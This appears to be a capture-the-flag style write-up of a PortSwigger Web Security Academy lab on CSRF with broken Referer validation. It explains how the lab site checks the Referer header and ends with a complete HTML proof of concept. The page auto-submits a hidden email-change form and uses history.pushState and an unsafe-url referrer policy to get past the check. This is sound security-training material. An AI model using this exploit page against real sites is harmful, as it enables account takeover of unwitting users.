# CSRF with broken Referer validation

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

Update the email 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c4cea6d5-2dc5-4788-a3a5-cf1b7358304b/2024-02-27_15-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SUA4ZMSW%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJtazfIVmfZa1GuSphb4z0oAf4Os30DbXMvFO7gZnt%2FAiEA4UoUX12aHE91EnZvnRnxKVtHmCNvHw2ZFdEIIJEeRXwqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDP4s2HYBBePNxOy99ircAzCKOlC%2FiUD9iLqHtQyJfzWTHIoBuoj5oxBuUnlTpch7ICiZGgM7ISBtkXeAzXu%2FkbeNba0gk%2BK0sbV0hFq2mxlc98p0LZ4IL8x9ofJUwB%2B27w1hlARGlBgu2qJFi8e2VefqwhlJL1eLkXWWguJaignQOJsoJa6OiU0hQMRjz%2B9u6mFzrAPZRXWNNRz39bkAfP%2BUzBFVftw8ZIoKHs70RUCAXch0A4260WaRaKynG3K2AeU%2Bb54XXNxhBH2Pkyu7RG9hcSD9nG%2BTTQo4bhOnFxTyy%2Fe0ZmQC64REgNzz7sqcGKvcQl1pmeGXT%2BIJjXgdy%2BlL9ntWYvXvd1xEJPH3N08auxST242pf2pcPD1e2Kk4ezIXV0NPXhHFQ8JDKZGaH9aZGhxZ1V43XUsUH358RzoquqjmI8SyUUqUSLtZtpWN0AkUffJBJXdBi8KJ%2FmHsAs507ne%2FygNhChvk9sBH8UvWXm7Gdz1YP63KscZx0a%2Fotvqm6Jh3RdrwBs78ozCMrm%2FhFHRSVUPtNsDo6S2a3CSUdRVfxcEtD0sFWsKBzDq0FVgol%2BGH6DPF%2FtTSd0mi%2FDgPfbcr6Ap62oJB10cXhRpEEq3HFg9nIxSdR%2Bkkj4TC4%2B9EmCPVYI53iaZIMN2Go9QGOqUBWbQmsLCrObU6sDeBr0fiVix44KlYmesztlg414a2OZ1DMK%2FheLaRlfvK3wbHaFLMzsyaLJr42mga%2FREka2ud63kYOTAUFs3uqJikW2WwSNXjKQuVELbdSYk4%2FEL8zqbmNsooTJOOmqHgyoBJiOYo5b822QQAC23BHI9cSvl46HGt4aen7kgFvQdsXY17%2BYToovFLMrlH%2Bb78QKT12jqGf1%2BIrdcn&X-Amz-Signature=95543375307c5e634397f9c2eeba8819f6ce6d6bdb9f1540c8597c797cf8ffe9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

> 💡 In order for a CSRF attack to be possible:

  - A relevant action: change a users email
  - Cookie-based session handling: session cookie
  - No unpredictable request parameters: no csrf token
**Generate CSRF PoC** (in prof. v.) or  
**craft a HTML form that performs CSRF attack to the victim:**

use the `exploit server` to test CSRF attack!

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/10ba55c1-6334-4b67-90ca-bbc7fb1d9293/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SUA4ZMSW%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJtazfIVmfZa1GuSphb4z0oAf4Os30DbXMvFO7gZnt%2FAiEA4UoUX12aHE91EnZvnRnxKVtHmCNvHw2ZFdEIIJEeRXwqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDP4s2HYBBePNxOy99ircAzCKOlC%2FiUD9iLqHtQyJfzWTHIoBuoj5oxBuUnlTpch7ICiZGgM7ISBtkXeAzXu%2FkbeNba0gk%2BK0sbV0hFq2mxlc98p0LZ4IL8x9ofJUwB%2B27w1hlARGlBgu2qJFi8e2VefqwhlJL1eLkXWWguJaignQOJsoJa6OiU0hQMRjz%2B9u6mFzrAPZRXWNNRz39bkAfP%2BUzBFVftw8ZIoKHs70RUCAXch0A4260WaRaKynG3K2AeU%2Bb54XXNxhBH2Pkyu7RG9hcSD9nG%2BTTQo4bhOnFxTyy%2Fe0ZmQC64REgNzz7sqcGKvcQl1pmeGXT%2BIJjXgdy%2BlL9ntWYvXvd1xEJPH3N08auxST242pf2pcPD1e2Kk4ezIXV0NPXhHFQ8JDKZGaH9aZGhxZ1V43XUsUH358RzoquqjmI8SyUUqUSLtZtpWN0AkUffJBJXdBi8KJ%2FmHsAs507ne%2FygNhChvk9sBH8UvWXm7Gdz1YP63KscZx0a%2Fotvqm6Jh3RdrwBs78ozCMrm%2FhFHRSVUPtNsDo6S2a3CSUdRVfxcEtD0sFWsKBzDq0FVgol%2BGH6DPF%2FtTSd0mi%2FDgPfbcr6Ap62oJB10cXhRpEEq3HFg9nIxSdR%2Bkkj4TC4%2B9EmCPVYI53iaZIMN2Go9QGOqUBWbQmsLCrObU6sDeBr0fiVix44KlYmesztlg414a2OZ1DMK%2FheLaRlfvK3wbHaFLMzsyaLJr42mga%2FREka2ud63kYOTAUFs3uqJikW2WwSNXjKQuVELbdSYk4%2FEL8zqbmNsooTJOOmqHgyoBJiOYo5b822QQAC23BHI9cSvl46HGt4aen7kgFvQdsXY17%2BYToovFLMrlH%2Bb78QKT12jqGf1%2BIrdcn&X-Amz-Signature=ed8bcd177fd12828949a89b30fd3a0e96ec73eba08708fa81f1801a989845bdc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/284bd78e-f50c-4407-a692-7550d0ba1fd0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SUA4ZMSW%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJtazfIVmfZa1GuSphb4z0oAf4Os30DbXMvFO7gZnt%2FAiEA4UoUX12aHE91EnZvnRnxKVtHmCNvHw2ZFdEIIJEeRXwqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDP4s2HYBBePNxOy99ircAzCKOlC%2FiUD9iLqHtQyJfzWTHIoBuoj5oxBuUnlTpch7ICiZGgM7ISBtkXeAzXu%2FkbeNba0gk%2BK0sbV0hFq2mxlc98p0LZ4IL8x9ofJUwB%2B27w1hlARGlBgu2qJFi8e2VefqwhlJL1eLkXWWguJaignQOJsoJa6OiU0hQMRjz%2B9u6mFzrAPZRXWNNRz39bkAfP%2BUzBFVftw8ZIoKHs70RUCAXch0A4260WaRaKynG3K2AeU%2Bb54XXNxhBH2Pkyu7RG9hcSD9nG%2BTTQo4bhOnFxTyy%2Fe0ZmQC64REgNzz7sqcGKvcQl1pmeGXT%2BIJjXgdy%2BlL9ntWYvXvd1xEJPH3N08auxST242pf2pcPD1e2Kk4ezIXV0NPXhHFQ8JDKZGaH9aZGhxZ1V43XUsUH358RzoquqjmI8SyUUqUSLtZtpWN0AkUffJBJXdBi8KJ%2FmHsAs507ne%2FygNhChvk9sBH8UvWXm7Gdz1YP63KscZx0a%2Fotvqm6Jh3RdrwBs78ozCMrm%2FhFHRSVUPtNsDo6S2a3CSUdRVfxcEtD0sFWsKBzDq0FVgol%2BGH6DPF%2FtTSd0mi%2FDgPfbcr6Ap62oJB10cXhRpEEq3HFg9nIxSdR%2Bkkj4TC4%2B9EmCPVYI53iaZIMN2Go9QGOqUBWbQmsLCrObU6sDeBr0fiVix44KlYmesztlg414a2OZ1DMK%2FheLaRlfvK3wbHaFLMzsyaLJr42mga%2FREka2ud63kYOTAUFs3uqJikW2WwSNXjKQuVELbdSYk4%2FEL8zqbmNsooTJOOmqHgyoBJiOYo5b822QQAC23BHI9cSvl46HGt4aen7kgFvQdsXY17%2BYToovFLMrlH%2Bb78QKT12jqGf1%2BIrdcn&X-Amz-Signature=42d1b70a9b402f0915411040c9a1487a10555e2c7ae88a35e25fbbf8388b746d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/49d61922-5ef6-44ef-bd44-dce28f076652/2024-02-27_15-45.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SUA4ZMSW%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJtazfIVmfZa1GuSphb4z0oAf4Os30DbXMvFO7gZnt%2FAiEA4UoUX12aHE91EnZvnRnxKVtHmCNvHw2ZFdEIIJEeRXwqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDP4s2HYBBePNxOy99ircAzCKOlC%2FiUD9iLqHtQyJfzWTHIoBuoj5oxBuUnlTpch7ICiZGgM7ISBtkXeAzXu%2FkbeNba0gk%2BK0sbV0hFq2mxlc98p0LZ4IL8x9ofJUwB%2B27w1hlARGlBgu2qJFi8e2VefqwhlJL1eLkXWWguJaignQOJsoJa6OiU0hQMRjz%2B9u6mFzrAPZRXWNNRz39bkAfP%2BUzBFVftw8ZIoKHs70RUCAXch0A4260WaRaKynG3K2AeU%2Bb54XXNxhBH2Pkyu7RG9hcSD9nG%2BTTQo4bhOnFxTyy%2Fe0ZmQC64REgNzz7sqcGKvcQl1pmeGXT%2BIJjXgdy%2BlL9ntWYvXvd1xEJPH3N08auxST242pf2pcPD1e2Kk4ezIXV0NPXhHFQ8JDKZGaH9aZGhxZ1V43XUsUH358RzoquqjmI8SyUUqUSLtZtpWN0AkUffJBJXdBi8KJ%2FmHsAs507ne%2FygNhChvk9sBH8UvWXm7Gdz1YP63KscZx0a%2Fotvqm6Jh3RdrwBs78ozCMrm%2FhFHRSVUPtNsDo6S2a3CSUdRVfxcEtD0sFWsKBzDq0FVgol%2BGH6DPF%2FtTSd0mi%2FDgPfbcr6Ap62oJB10cXhRpEEq3HFg9nIxSdR%2Bkkj4TC4%2B9EmCPVYI53iaZIMN2Go9QGOqUBWbQmsLCrObU6sDeBr0fiVix44KlYmesztlg414a2OZ1DMK%2FheLaRlfvK3wbHaFLMzsyaLJr42mga%2FREka2ud63kYOTAUFs3uqJikW2WwSNXjKQuVELbdSYk4%2FEL8zqbmNsooTJOOmqHgyoBJiOYo5b822QQAC23BHI9cSvl46HGt4aen7kgFvQdsXY17%2BYToovFLMrlH%2Bb78QKT12jqGf1%2BIrdcn&X-Amz-Signature=dd9902dffb27545616f7191acf453a36577b31a92b655a4a8ccd816ba849dbb7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Since the `Referer` HTTP header can be fully controlled by the attacker, we can bypass this check!

send this request into Repeater 

> 💡 Testing Referer header for CSRF attacks:

  1. Remove the Referer header
  1. Check which portion of the referrer header is the application validating

1. Remove the Referer header

It still gives the same error "Invalid referer header”

1. Check which portion of the referrer header is the application validating

Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. 

The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string. 

> 💡 **According the **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/API/History/pushState)**, we can use a JavaScript function called **`history.pushState()`**:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054430.png)

To bypass that check, we can add the `history.pushState()` function in our exploit:

This will cause the `Referer` header in the generated request to contain the URL of the target site in the query string.

However, this still couldn’t work, as many browsers now strip the query string from the Referer header by default as a security measure.

**To bypass that, we can just add a new **`<meta>`** tag to override that behavior and ensure that the full URL is included in the request:**

> 💡 Fortunately, the documentation regarding referrer-policy on [mozilla.org](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) shows the solution:

![](https://github.com/frank-leitner/portswigger-websecurity-academy/raw/main/12_cross_site_request_forgery_CSRF/CSRF_with_broken_Referer_validation/img/referrer_policy_docu.png)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/b5868926-f66b-4b83-ab9f-7695e5f2d4bb/2024-02-27_17-27.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SUA4ZMSW%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJtazfIVmfZa1GuSphb4z0oAf4Os30DbXMvFO7gZnt%2FAiEA4UoUX12aHE91EnZvnRnxKVtHmCNvHw2ZFdEIIJEeRXwqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDP4s2HYBBePNxOy99ircAzCKOlC%2FiUD9iLqHtQyJfzWTHIoBuoj5oxBuUnlTpch7ICiZGgM7ISBtkXeAzXu%2FkbeNba0gk%2BK0sbV0hFq2mxlc98p0LZ4IL8x9ofJUwB%2B27w1hlARGlBgu2qJFi8e2VefqwhlJL1eLkXWWguJaignQOJsoJa6OiU0hQMRjz%2B9u6mFzrAPZRXWNNRz39bkAfP%2BUzBFVftw8ZIoKHs70RUCAXch0A4260WaRaKynG3K2AeU%2Bb54XXNxhBH2Pkyu7RG9hcSD9nG%2BTTQo4bhOnFxTyy%2Fe0ZmQC64REgNzz7sqcGKvcQl1pmeGXT%2BIJjXgdy%2BlL9ntWYvXvd1xEJPH3N08auxST242pf2pcPD1e2Kk4ezIXV0NPXhHFQ8JDKZGaH9aZGhxZ1V43XUsUH358RzoquqjmI8SyUUqUSLtZtpWN0AkUffJBJXdBi8KJ%2FmHsAs507ne%2FygNhChvk9sBH8UvWXm7Gdz1YP63KscZx0a%2Fotvqm6Jh3RdrwBs78ozCMrm%2FhFHRSVUPtNsDo6S2a3CSUdRVfxcEtD0sFWsKBzDq0FVgol%2BGH6DPF%2FtTSd0mi%2FDgPfbcr6Ap62oJB10cXhRpEEq3HFg9nIxSdR%2Bkkj4TC4%2B9EmCPVYI53iaZIMN2Go9QGOqUBWbQmsLCrObU6sDeBr0fiVix44KlYmesztlg414a2OZ1DMK%2FheLaRlfvK3wbHaFLMzsyaLJr42mga%2FREka2ud63kYOTAUFs3uqJikW2WwSNXjKQuVELbdSYk4%2FEL8zqbmNsooTJOOmqHgyoBJiOYo5b822QQAC23BHI9cSvl46HGt4aen7kgFvQdsXY17%2BYToovFLMrlH%2Bb78QKT12jqGf1%2BIrdcn&X-Amz-Signature=ab38309af0539ec3cdffa87da6c01c48d71a4800d391ccb8ef30ac9a13b6ca6b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <head>
        <meta name="referrer" content="unsafe-url">
    </head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ab4004803380574938c5dbf00e200fa.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0ab4004803380574938c5dbf00e200fa.web-security-academy.net/my-account');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
